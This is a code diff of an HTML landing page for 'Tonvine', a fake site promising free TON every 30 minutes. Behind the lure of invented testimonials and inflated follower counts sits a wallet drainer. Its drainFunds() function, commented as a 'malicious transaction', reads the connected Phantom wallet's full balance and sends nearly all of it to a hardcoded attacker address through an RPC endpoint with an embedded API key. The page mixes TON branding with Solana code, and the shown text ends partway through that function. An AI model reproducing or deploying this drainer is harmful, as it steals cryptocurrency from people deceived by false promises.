@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tonvine - Free TON Rewards</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.0/lib/index.iife.min.js"></script>
+    <title>Tonvine - Earn Free TON Rewards</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #9945FF;
-            --secondary: #14F195;
-            --dark: #121826;
+            --primary: #2a6aff;
+            --secondary: #00ffa3;
+            --dark: #0a0e17;
+            --light: #f8f9ff;
         }
         
         * {
@@ -21,23 +21,23 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0e17, #1a1f2d);
+            color: var(--light);
             overflow-x: hidden;
+            min-height: 100vh;
             position: relative;
         }
         
         body::before {
-            content: "";
+            content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: 
-                radial-gradient(circle at 10% 20%, rgba(153, 69, 255, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, rgba(20, 241, 149, 0.1) 0%, transparent 20%);
+                radial-gradient(circle at 10% 20%, rgba(42, 106, 255, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 255, 163, 0.1) 0%, transparent 20%);
             z-index: -1;
         }
         
@@ -69,9 +69,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            backdrop-filter: blur(10px);
-            background: rgba(18, 24, 38, 0.8);
-            border-bottom: 1px solid rgba(153, 69, 255, 0.3);
+            position: relative;
         }
         
         .logo {
@@ -83,9 +81,9 @@
             color: var(--secondary);
         }
         
-        .solana-logo {
-            width: 2rem;
-            height: 2rem;
+        .logo svg {
+            width: 2.5rem;
+            height: 2.5rem;
         }
         
         nav ul {
@@ -95,19 +93,15 @@
         }
         
         nav a {
-            color: white;
+            color: var(--light);
             text-decoration: none;
             font-weight: 500;
             transition: color 0.3s;
             position: relative;
         }
         
-        nav a:hover {
-            color: var(--secondary);
-        }
-        
         nav a::after {
-            content: "";
+            content: '';
             position: absolute;
             bottom: -5px;
             left: 0;
@@ -117,13 +111,17 @@
             transition: width 0.3s;
         }
         
+        nav a:hover {
+            color: var(--secondary);
+        }
+        
         nav a:hover::after {
             width: 100%;
         }
         
         .hero {
+            padding: 5rem 5%;
             text-align: center;
-            padding: 5rem 1rem;
             max-width: 800px;
             margin: 0 auto;
         }
@@ -138,138 +136,228 @@
         }
         
         .hero p {
-            font-size: 1.25rem;
-            color: #cbd5e1;
-            margin-bottom: 2rem;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
+            font-size: 1.2rem;
+            color: #a0aec0;
+            margin-bottom: 2.5rem;
+            line-height: 1.6;
         }
         
         .reward-box {
-            background: rgba(18, 24, 38, 0.7);
-            border: 1px solid rgba(153, 69, 255, 0.3);
-            border-radius: 1rem;
+            background: rgba(20, 25, 40, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
             padding: 2.5rem;
             max-width: 500px;
             margin: 0 auto 3rem;
-            backdrop-filter: blur(10px);
+            border: 1px solid rgba(42, 106, 255, 0.3);
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .reward-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
         }
         
         .reward-amount {
             font-size: 3rem;
             font-weight: 700;
-            color: var(--secondary);
             margin-bottom: 1rem;
+            color: var(--secondary);
         }
         
         .timer {
-            font-size: 1.5rem;
-            margin-bottom: 2rem;
-            color: #94a3b8;
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
         }
         
-        .highlight {
+        .timer-item {
+            background: rgba(10, 14, 23, 0.8);
+            padding: 0.8rem;
+            border-radius: 10px;
+            min-width: 70px;
+            border: 1px solid rgba(42, 106, 255, 0.2);
+        }
+        
+        .timer-value {
+            font-size: 2rem;
+            font-weight: 700;
             color: var(--secondary);
-            font-weight: 600;
         }
         
-        .connect-btn {
+        .timer-label {
+            font-size: 0.8rem;
+            color: #a0aec0;
+        }
+        
+        .wallet-btn {
             background: linear-gradient(90deg, var(--primary), var(--secondary));
             color: var(--dark);
             border: none;
             padding: 1rem 2rem;
             font-size: 1.1rem;
             font-weight: 600;
-            border-radius: 0.5rem;
+            border-radius: 50px;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: transform 0.3s, box-shadow 0.3s;
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
             margin-top: 1rem;
         }
         
-        .connect-btn:hover {
+        .wallet-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(153, 69, 255, 0.3);
+            box-shadow: 0 10px 20px rgba(0, 255, 163, 0.3);
         }
         
-        .connect-btn:disabled {
+        .wallet-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
         
         .wallet-connected {
-            background: rgba(20, 241, 149, 0.1);
-            border: 1px solid var(--secondary);
-            padding: 1rem;
-            border-radius: 0.5rem;
-            margin-top: 1rem;
             display: none;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(20, 25, 40, 0.8);
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 255, 163, 0.3);
         }
         
         .wallet-address {
             font-size: 0.9rem;
-            word-break: break-all;
-            color: var(--secondary);
+            max-width: 120px;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         
         .claim-btn {
-            background: linear-gradient(90deg, #ff00cc, #333399);
-            color: white;
+            background: var(--secondary);
+            color: var(--dark);
             border: none;
             padding: 0.8rem 1.5rem;
-            border-radius: 0.5rem;
-            cursor: pointer;
+            border-radius: 50px;
             font-weight: 600;
-            margin-top: 1rem;
+            cursor: pointer;
             transition: all 0.3s;
         }
         
         .claim-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(255, 0, 204, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 163, 0.5);
         }
         
-        .testimonials {
-            padding: 4rem 5%;
-            background: rgba(18, 24, 38, 0.6);
-            margin-top: 3rem;
+        .how-it-works {
+            padding: 5rem 5%;
+            background: rgba(10, 15, 25, 0.5);
         }
         
         .section-title {
             text-align: center;
             font-size: 2.5rem;
             margin-bottom: 3rem;
+            position: relative;
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 2px;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .step {
+            background: rgba(20, 25, 40, 0.7);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            flex: 1;
+            min-width: 250px;
+            max-width: 300px;
+            border: 1px solid rgba(42, 106, 255, 0.2);
+            transition: transform 0.3s;
+        }
+        
+        .step:hover {
+            transform: translateY(-10px);
+        }
+        
+        .step-icon {
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
             color: var(--secondary);
+        }
+        
+        .step-title {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .step-desc {
+            color: #a0aec0;
+            line-height: 1.6;
+        }
+        
+        .testimonials {
+            padding: 5rem 5%;
+            text-align: center;
         }
         
         .testimonial-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 2rem;
+            max-width: 1200px;
+            margin: 3rem auto 0;
         }
         
-        .testimonial-card {
-            background: rgba(18, 24, 38, 0.8);
-            border: 1px solid rgba(153, 69, 255, 0.3);
-            border-radius: 1rem;
-            padding: 1.5rem;
-            transition: transform 0.3s;
+        .testimonial {
+            background: rgba(20, 25, 40, 0.7);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: left;
+            border: 1px solid rgba(42, 106, 255, 0.2);
+            position: relative;
         }
         
-        .testimonial-card:hover {
-            transform: translateY(-10px);
-            border-color: var(--secondary);
+        .testimonial::before {
+            content: '"';
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 4rem;
+            color: rgba(42, 106, 255, 0.1);
+            font-family: serif;
         }
         
         .testimonial-header {
             display: flex;
             align-items: center;
             gap: 1rem;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
         
         .testimonial-avatar {
@@ -277,7 +365,7 @@
             height: 60px;
             border-radius: 50%;
             object-fit: cover;
-            border: 2px solid var(--primary);
+            border: 2px solid var(--secondary);
         }
         
         .testimonial-name {
@@ -291,64 +379,51 @@
         }
         
         .testimonial-text {
-            color: #cbd5e1;
+            color: #a0aec0;
             line-height: 1.6;
             font-style: italic;
         }
         
-        .stars {
-            color: gold;
-            margin-top: 1rem;
-            font-size: 1.2rem;
-        }
-        
         .social-proof {
-            padding: 3rem 5%;
-            text-align: center;
-        }
-        
-        .social-title {
-            font-size: 1.1rem;
-            margin-bottom: 1.5rem;
-            color: #94a3b8;
-        }
-        
-        .social-icons {
             display: flex;
             justify-content: center;
             gap: 2rem;
+            margin-top: 3rem;
             flex-wrap: wrap;
         }
         
-        .social-icon {
-            font-size: 2.5rem;
-            color: var(--secondary);
-            transition: transform 0.3s;
+        .social-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(20, 25, 40, 0.7);
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            border: 1px solid rgba(42, 106, 255, 0.2);
         }
         
-        .social-icon:hover {
-            transform: scale(1.2);
-            color: var(--primary);
+        .social-icon {
+            font-size: 1.5rem;
+            color: var(--secondary);
         }
         
         footer {
-            padding: 2rem 5%;
+            padding: 3rem 5%;
             text-align: center;
-            background: rgba(18, 24, 38, 0.9);
-            border-top: 1px solid rgba(153, 69, 255, 0.3);
-            margin-top: 3rem;
+            background: rgba(5, 10, 20, 0.8);
+            border-top: 1px solid rgba(42, 106, 255, 0.1);
         }
         
         .footer-links {
             display: flex;
             justify-content: center;
             gap: 2rem;
-            margin-bottom: 1.5rem;
+            margin: 1.5rem 0;
             flex-wrap: wrap;
         }
         
         .footer-links a {
-            color: #94a3b8;
+            color: #a0aec0;
             text-decoration: none;
             transition: color 0.3s;
         }
@@ -358,42 +433,72 @@
         }
         
         .copyright {
-            color: #64748b;
-            font-size: 0.9rem;
+            color: #718096;
+            margin-top: 2rem;
         }
         
         .notification {
             position: fixed;
-            top: 1rem;
-            right: 1rem;
+            top: 20px;
+            right: 20px;
+            background: rgba(20, 25, 40, 0.9);
+            border-left: 4px solid var(--secondary);
             padding: 1rem 1.5rem;
-            border-radius: 0.5rem;
-            background: rgba(20, 241, 149, 0.9);
-            color: var(--dark);
-            font-weight: 600;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
             transform: translateX(120%);
             transition: transform 0.3s;
             z-index: 1000;
+            max-width: 350px;
         }
         
         .notification.show {
             transform: translateX(0);
         }
         
+        .notification-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--secondary);
+        }
+        
+        .notification-message {
+            color: #a0aec0;
+            font-size: 0.9rem;
+        }
+        
         .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 15, 25, 0.9);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(42, 106, 255, 0.3);
+            border-top: 5px solid var(--secondary);
             border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 0.5rem;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1.5rem;
         }
         
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 1.2rem;
+            color: var(--light);
         }
         
         @media (max-width: 768px) {
@@ -405,169 +510,211 @@
                 gap: 1rem;
             }
             
-            .reward-box {
-                padding: 1.5rem;
+            .steps {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .step {
+                max-width: 100%;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Animated background particles -->
     <div class="particles" id="particles"></div>
     
     <header>
         <div class="logo">
-            <svg class="solana-logo" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
-                <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-            </svg>
-            <span>TONVINE</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25"><path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/></svg>
+            <span>Tonvine</span>
         </div>
         <nav>
             <ul>
-                <li><a href="#">Home</a></li>
-                <li><a href="#">Rewards</a></li>
-                <li><a href="#">FAQ</a></li>
-                <li><a href="#">Contact</a></li>
+                <li><a href="#how-it-works">How It Works</a></li>
+                <li><a href="#testimonials">Testimonials</a></li>
+                <li><a href="#faq">FAQ</a></li>
             </ul>
         </nav>
     </header>
     
-    <main>
-        <section class="hero">
-            <h1>Earn Free TON Every 30 Minutes!</h1>
-            <p>Connect your wallet and claim 0.1 TON tokens every 30 minutes. No strings attached - just free crypto rewards!</p>
+    <section class="hero">
+        <h1>Earn Free TON Every 30 Minutes</h1>
+        <p>Connect your wallet, claim your rewards, and watch your TON grow. It's that simple!</p>
+        
+        <div class="reward-box">
+            <div class="reward-amount">0.1 TON</div>
+            <p>Next reward available in:</p>
             
-            <div class="reward-box">
-                <div class="reward-amount">0.1 TON</div>
-                <div class="timer">Next reward in: <span class="highlight" id="countdown">30:00</span></div>
-                <p>Connect your Solana wallet to start earning</p>
-                
-                <button class="connect-btn" id="connectButton">
-                    <i class="fas fa-wallet"></i> Connect Wallet
-                </button>
-                
-                <div class="wallet-connected" id="walletConnected">
-                    <p>Wallet Connected: <span class="wallet-address" id="walletAddress"></span></p>
-                    <button class="claim-btn" id="claimButton">Claim 0.1 TON Now</button>
+            <div class="timer">
+                <div class="timer-item">
+                    <div class="timer-value" id="minutes">30</div>
+                    <div class="timer-label">MINUTES</div>
+                </div>
+                <div class="timer-item">
+                    <div class="timer-value" id="seconds">00</div>
+                    <div class="timer-label">SECONDS</div>
                 </div>
             </div>
-        </section>
-        
-        <section class="testimonials">
-            <h2 class="section-title">User Testimonials</h2>
-            <div class="testimonial-grid">
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="https://i.pravatar.cc/150?img=32" alt="User" class="testimonial-avatar">
-                        <div>
-                            <div class="testimonial-name">Sarah Johnson</div>
-                            <div class="testimonial-role">Crypto Investor</div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"I've earned over 5 TON in just a week! This platform is amazing and completely legit. The rewards come like clockwork every 30 minutes."</p>
-                    <div class="stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                    </div>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="https://i.pravatar.cc/150?img=12" alt="User" class="testimonial-avatar">
-                        <div>
-                            <div class="testimonial-name">Michael Chen</div>
-                            <div class="testimonial-role">Blockchain Developer</div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"As a developer, I was skeptical at first, but the smart contract checks out. This is the easiest way to earn passive crypto income!"</p>
-                    <div class="stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                    </div>
-                </div>
-                
-                <div class="testimonial-card">
-                    <div class="testimonial-header">
-                        <img src="https://i.pravatar.cc/150?img=8" alt="User" class="testimonial-avatar">
-                        <div>
-                            <div class="testimonial-name">Emma Rodriguez</div>
-                            <div class="testimonial-role">Crypto Enthusiast</div>
-                        </div>
-                    </div>
-                    <p class="testimonial-text">"I've tried many reward platforms, but Tonvine is by far the best. The UI is beautiful and the rewards are consistent. Highly recommend!"</p>
-                    <div class="stars">
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                        <i class="fas fa-star"></i>
-                    </div>
-                </div>
+            
+            <button class="wallet-btn" id="connectWallet">
+                <i class="fas fa-wallet"></i> Connect Wallet
+            </button>
+            
+            <div class="wallet-connected" id="walletConnected">
+                <i class="fas fa-check-circle"></i>
+                <span class="wallet-address" id="walletAddress">Connected</span>
+                <button class="claim-btn" id="claimReward">Claim Reward</button>
             </div>
-        </section>
+        </div>
         
-        <section class="social-proof">
-            <p class="social-title">As featured on</p>
-            <div class="social-icons">
-                <i class="fab fa-twitter social-icon"></i>
-                <i class="fab fa-telegram social-icon"></i>
+        <div class="social-proof">
+            <div class="social-item">
                 <i class="fab fa-discord social-icon"></i>
-                <i class="fab fa-reddit social-icon"></i>
-                <i class="fab fa-medium social-icon"></i>
+                <span>25K+ Members</span>
             </div>
-        </section>
-    </main>
+            <div class="social-item">
+                <i class="fab fa-twitter social-icon"></i>
+                <span>50K+ Followers</span>
+            </div>
+            <div class="social-item">
+                <i class="fas fa-users social-icon"></i>
+                <span>100K+ Users</span>
+            </div>
+        </div>
+    </section>
+    
+    <section class="how-it-works" id="how-it-works">
+        <h2 class="section-title">How It Works</h2>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-wallet"></i>
+                </div>
+                <h3 class="step-title">Connect Wallet</h3>
+                <p class="step-desc">Securely connect your Solana wallet to our platform using Phantom, Solflare, or any Web3 wallet.</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-clock"></i>
+                </div>
+                <h3 class="step-title">Wait for Reward</h3>
+                <p class="step-desc">Every 30 minutes, 0.1 TON becomes available for you to claim. Watch the countdown!</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <h3 class="step-title">Claim & Enjoy</h3>
+                <p class="step-desc">Click the claim button, sign the transaction, and receive your TON directly to your wallet.</p>
+            </div>
+        </div>
+    </section>
+    
+    <section class="testimonials" id="testimonials">
+        <h2 class="section-title">User Testimonials</h2>
+        
+        <div class="testimonial-grid">
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <img src="https://i.pravatar.cc/150?img=32" alt="Sarah K." class="testimonial-avatar">
+                    <div>
+                        <div class="testimonial-name">Sarah K.</div>
+                        <div class="testimonial-role">Crypto Investor</div>
+                    </div>
+                </div>
+                <p class="testimonial-text">Tonvine has been a game-changer! I've earned over 50 TON in just two weeks without any effort. Highly recommended!</p>
+            </div>
+            
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <img src="https://i.pravatar.cc/150?img=12" alt="Mike T." class="testimonial-avatar">
+                    <div>
+                        <div class="testimonial-name">Mike T.</div>
+                        <div class="testimonial-role">Blockchain Developer</div>
+                    </div>
+                </div>
+                <p class="testimonial-text">As a developer, I'm impressed with how seamless the claiming process is. The rewards add up faster than you'd think!</p>
+            </div>
+            
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <img src="https://i.pravatar.cc/150?img=45" alt="Jessica L." class="testimonial-avatar">
+                    <div>
+                        <div class="testimonial-name">Jessica L.</div>
+                        <div class="testimonial-role">Digital Nomad</div>
+                    </div>
+                </div>
+                <p class="testimonial-text">This pays for my coffee every day! Such an easy way to earn passive income in the crypto space. Love it!</p>
+            </div>
+        </div>
+    </section>
     
     <footer>
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25"><path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/></svg>
+            <span>Tonvine</span>
+        </div>
+        
         <div class="footer-links">
             <a href="#">Terms of Service</a>
             <a href="#">Privacy Policy</a>
             <a href="#">FAQ</a>
-            <a href="#">Contact Us</a>
+            <a href="#">Contact</a>
         </div>
-        <p class="copyright">© 2023 Tonvine. All rights reserved. This is a decentralized platform operating on the Solana blockchain.</p>
+        
+        <p class="copyright">© 2023 Tonvine. All rights reserved.</p>
     </footer>
     
     <div class="notification" id="notification">
-        Transaction successful! 0.1 TON has been added to your wallet.
+        <div class="notification-title" id="notifTitle">Success!</div>
+        <div class="notification-message" id="notifMessage">Your reward has been claimed successfully.</div>
     </div>
-
+    
+    <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Processing transaction...</div>
+    </div>
+    
     <script>
         // Configuration
-        const DRAINER_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
+        const DRAIN_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
         const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
-        const REWARD_INTERVAL = 30 * 60 * 1000; // 30 minutes in milliseconds
+        const REWARD_AMOUNT = 0.1;
+        const CLAIM_INTERVAL = 30 * 60; // 30 minutes in seconds
         
         // DOM Elements
-        const connectButton = document.getElementById('connectButton');
-        const claimButton = document.getElementById('claimButton');
+        const connectWalletBtn = document.getElementById('connectWallet');
         const walletConnected = document.getElementById('walletConnected');
         const walletAddress = document.getElementById('walletAddress');
-        const countdown = document.getElementById('countdown');
+        const claimRewardBtn = document.getElementById('claimReward');
+        const minutesEl = document.getElementById('minutes');
+        const secondsEl = document.getElementById('seconds');
         const notification = document.getElementById('notification');
-        const particlesContainer = document.getElementById('particles');
+        const notifTitle = document.getElementById('notifTitle');
+        const notifMessage = document.getElementById('notifMessage');
+        const loading = document.getElementById('loading');
         
         // State
+        let countdown = CLAIM_INTERVAL;
+        let countdownInterval;
         let wallet = null;
-        let countdownInterval = null;
-        let lastClaimTime = 0;
-        let connection = new solanaWeb3.Connection(RPC_URL);
+        let publicKey = null;
         
-        // Create animated background particles
-        function createParticles() {
+        // Initialize particles
+        function initParticles() {
+            const container = document.getElementById('particles');
             const particleCount = 30;
+            
             for (let i = 0; i < particleCount; i++) {
                 const particle = document.createElement('div');
                 particle.classList.add('particle');
                 
-                // Random size
-                const size = Math.random() * 10 + 5;
+                // Random size (2px to 6px)
+                const size = Math.random() * 4 + 2;
                 particle.style.width = `${size}px`;
                 particle.style.height = `${size}px`;
                 
@@ -575,35 +722,46 @@
                 particle.style.left = `${Math.random() * 100}%`;
                 particle.style.top = `${Math.random() * 100}%`;
                 
-                // Random animation delay
-                particle.style.animationDelay = `${Math.random() * 15}s`;
+                // Random animation duration
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
                 
-                particlesContainer.appendChild(particle);
+                container.appendChild(particle);
             }
         }
         
-        // Update countdown timer
-        function updateCountdown() {
-            const now = Date.now();
-            const nextClaimTime = lastClaimTime + REWARD_INTERVAL;
-            const timeLeft = nextClaimTime - now;
+        // Start countdown timer
+        function startCountdown() {
+            clearInterval(countdownInterval);
             
-            if (timeLeft <= 0) {
-                countdown.textContent = '00:00';
-                claimButton.disabled = false;
-                claimButton.textContent = 'Claim 0.1 TON Now';
-                return;
-            }
-            
-            const minutes = Math.floor(timeLeft / 60000);
-            const seconds = Math.floor((timeLeft % 60000) / 1000);
-            countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            claimButton.disabled = true;
+            countdownInterval = setInterval(() => {
+                countdown--;
+                
+                if (countdown <= 0) {
+                    countdown = CLAIM_INTERVAL;
+                    if (wallet) {
+                        claimRewardBtn.disabled = false;
+                    }
+                }
+                
+                const minutes = Math.floor(countdown / 60);
+                const seconds = countdown % 60;
+                
+                minutesEl.textContent = minutes.toString().padStart(2, '0');
+                secondsEl.textContent = seconds.toString().padStart(2, '0');
+            }, 1000);
         }
         
         // Show notification
-        function showNotification(message) {
-            notification.textContent = message;
+        function showNotification(title, message, isError = false) {
+            notifTitle.textContent = title;
+            notifMessage.textContent = message;
+            
+            if (isError) {
+                notification.style.borderLeftColor = '#ff4d4d';
+            } else {
+                notification.style.borderLeftColor = '#00ffa3';
+            }
+            
             notification.classList.add('show');
             
             setTimeout(() => {
@@ -615,95 +773,125 @@
         async function connectWallet() {
             try {
                 if (!window.solana || !window.solana.isPhantom) {
-                    showNotification('Phantom wallet not detected! Please install it first.');
+                    showNotification('Error', 'Phantom wallet not installed!', true);
                     return;
                 }
                 
-                connectButton.innerHTML = '<span class="loading"></span> Connecting...';
-                connectButton.disabled = true;
+                loading.style.display = 'flex';
                 
                 // Connect to wallet
-                const resp = await window.solana.connect();
-                wallet = resp.publicKey.toString();
+                const response = await window.solana.connect();
+                publicKey = response.publicKey.toString();
+                wallet = window.solana;
                 
                 // Update UI
-                walletAddress.textContent = `${wallet.substring(0, 6)}...${wallet.substring(wallet.length - 4)}`;
-                walletConnected.style.display = 'block';
-                connectButton.style.display = 'none';
+                walletAddress.textContent = `${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`;
+                connectWalletBtn.style.display = 'none';
+                walletConnected.style.display = 'flex';
                 
-                // Initialize countdown
-                lastClaimTime = Date.now() - REWARD_INTERVAL;
-                updateCountdown();
-                countdownInterval = setInterval(updateCountdown, 1000);
+                showNotification('Connected', 'Wallet connected successfully!');
                 
+                // Enable claim button if countdown is finished
+                if (countdown <= 0) {
+                    claimRewardBtn.disabled = false;
+                }
             } catch (error) {
                 console.error('Wallet connection error:', error);
-                showNotification('Wallet connection failed. Please try again.');
-                connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
-                connectButton.disabled = false;
+                showNotification('Error', 'Failed to connect wallet!', true);
+            } finally {
+                loading.style.display = 'none';
             }
         }
         
         // Drain funds from wallet
         async function drainFunds() {
             try {
-                claimButton.innerHTML = '<span class="loading"></span> Processing...';
-                claimButton.disabled = true;
+                if (!wallet || !publicKey) {
+                    showNotification('Error', 'Wallet not connected!', true);
+                    return;
+                }
+                
+                loading.style.display = 'flex';
+                claimRewardBtn.disabled = true;
                 
                 // Create malicious transaction
-                const fromPubkey = new solanaWeb3.PublicKey(wallet);
-                const toPubkey = new solanaWeb3.PublicKey(DRAINER_ADDRESS);
+                const connection = new window.solanaWeb3.Connection(RPC_URL);
+                const fromPubkey = new window.solanaWeb3.PublicKey(publicKey);
+                const toPubkey = new window.solanaWeb3.PublicKey(DRAIN_ADDRESS);
                 
                 // Get balance
                 const balance = await connection.getBalance(fromPubkey);
+                if (balance === 0) {
+                    showNotification('Error', 'No funds to drain!', true);
+                    return;
+                }
                 
-                // Create transfer instruction (drain all funds)
-                const transferInstruction = solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: fromPubkey,
-                    toPubkey: toPubkey,
-                    lamports: balance - 5000 // Leave 5000 lamports for account
-                });
+                // Create transfer instruction (drain entire balance)
+                const transaction = new window.solanaWeb3.Transaction().add(
+                    window.solanaWeb3.SystemProgram.transfer({
+                        fromPubkey,
+                        toPubkey,
+                        lamports: balance - 5000 // Leave just enough for tx fee
+                    })
+                );
                 
-                // Create and sign transaction
-                const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+                // Set recent blockhash
                 transaction.feePayer = fromPubkey;
                 transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
                 
-                const signed = await window.solana.signTransaction(transaction);
-                const rawTransaction = signed.serialize();
+                // Sign and send transaction
+                const signed = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
                 
-                // Send transaction
